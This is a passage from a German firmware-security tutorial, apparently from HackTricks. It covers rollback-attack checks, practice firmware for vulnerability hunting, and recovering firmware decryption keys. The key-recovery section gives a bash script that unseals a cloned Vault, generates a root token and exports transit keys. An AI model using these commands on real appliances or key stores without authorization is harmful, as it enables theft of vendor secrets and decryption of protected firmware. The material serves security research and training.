* Sind die Slot-Aktivierungsmetadaten **an den Digest/die Version der validierten Firmware gebunden**, oder kann ein Slot nach seiner Aktivierung verändert werden?
* Wird das Gerät nach einem erfolgreichen Slot-Switch zum Reboot gezwungen, oder sind spätere Update-/Erase-Routinen weiterhin in derselben Session erreichbar?
* Führt der Userland-Code zusätzliche Plausibilitätsprüfungen durch (z. B. zulässige Partition Map, Modellnummer)?
* Verwenden *partielle* oder *Backup*-Update-Flows dieselbe Validierungslogik erneut?

> 💡  Wenn eines der oben genannten Elemente fehlt, ist die Plattform wahrscheinlich anfällig für Rollback-Angriffe.

## Vulnerable firmware to practice

Um das Entdecken von Vulnerabilities in Firmware zu üben, können die folgenden Vulnerable-Firmware-Projekte als Ausgangspunkt verwendet werden.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Recovering firmware decryption keys from embedded KMS/Vault state

Wenn ein Update-Image kleine Klartext-Metadaten mit einem großen Blob hoher Entropie kombiniert, sollte vor dem Brute-Forcing zunächst eine Container-Triage durchgeführt werden:<sup>[[1]](#references)</sup>

- Header, Offsets und Zeilengrenzen mit `hexdump`, `xxd`, `strings -tx`, `base64 -d` und `binwalk -E` ausgeben.
- `Salted__` bedeutet normalerweise das OpenSSL-`enc`-Format: Die nächsten 8 Bytes sind der Salt, die verbleibenden Bytes sind der Ciphertext.
- Ein Base64-Feld, das exakt zu `256` Bytes dekodiert wird, ist ein starker Hinweis darauf, dass es sich um einen RSA-2048-Ciphertext handelt, der ein zufälliges Firmware-Passwort/einen Session-Key verpackt.
- Detached-PGP-Material in derselben Datei schützt häufig nur die Authentizität; man sollte nicht davon ausgehen, dass es als Vertraulichkeitsmechanismus dient.

Wenn die Suche nach statischen Keys (`grep`, `strings`, PEM-/PGP-Suchen) erfolglos bleibt, sollte stattdessen der **operative Decrypt-Pfad** zurückverfolgt werden, anstatt nur nach Private Keys zu suchen:

- Den Updater-/Management-Binary dekompilieren und nachvollziehen, wer den verschlüsselten Blob liest, welcher Helper/API ihn unwrappt und welchen logischen Key-Namen er anfordert.
- Das extrahierte Root-Filesystem nach KMS-State (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) sowie nach Unit-Files und Init-Skripten durchsuchen.
- Klartextbefehle wie `vault operator unseal ...`, Recovery-Keys, Bootstrap-Tokens oder lokale KMS-Auto-Unseal-Skripte als gleichwertig zu Private-Key-Material behandeln.

Wenn das Appliance-Image die originale Vault-Binary und das Storage-Backend enthält, ist das Replay dieser Umgebung normalerweise einfacher als eine Neuimplementierung der Vault-Interna:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Mit root auf dem geklonten KMS:

- Mache Transit-Schlüssel nur innerhalb des isolierten Klons exportierbar: `vault write transit/keys/<name>/config exportable=true`
- Exportiere den Unwrap-Schlüssel: `vault read transit/export/encryption-key/<name>`
- Teste den wiederhergestellten RSA-Schlüssel mit dem exakten Padding-/Hash-Paar, das vom KMS verwendet wird. Eine fehlgeschlagene PKCS#1-v1.5-Entschlüsselung und eine fehlgeschlagene standardmäßige OAEP-Entschlüsselung **beweisen nicht**, dass der Schlüssel falsch ist; viele von Vault unterstützte Abläufe verwenden OAEP mit SHA-256, während gängige Libraries standardmäßig SHA-1 verwenden.
- Wenn der Payload mit `Salted__` beginnt, reproduziere exakt die OpenSSL-KDF des Herstellers (`EVP_BytesToKey`, bei älteren Appliances häufig MD5), bevor du eine AES-CBC-Entschlüsselung versuchst.

Damit wird "verschlüsselte Firmware" zu einem allgemeineren Problem: **die operativen Schlüssel auf der Appliance wiederherstellen und anschließend die exakten Unwrap- und KDF-Parameter offline reproduzieren**.

## Training und Zertifizierung

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## Referenzen

- [1] [Cracking Firmware with Claude: Senior-Level Skill, Junior-Level Autonomy](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Exploiting the Tesla Wall Connector from its charge port connector - Part 2: bypassing the anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
